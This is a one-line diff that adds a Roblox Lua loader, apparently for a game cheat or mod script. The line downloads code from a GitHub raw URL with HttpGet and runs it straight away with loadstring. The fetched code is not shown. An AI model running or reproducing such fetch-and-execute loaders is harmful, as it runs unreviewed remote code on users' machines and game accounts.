@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crLaros/Scripts/main/Roblox%20but%20every%20second%20you%20become%20stronger"))()
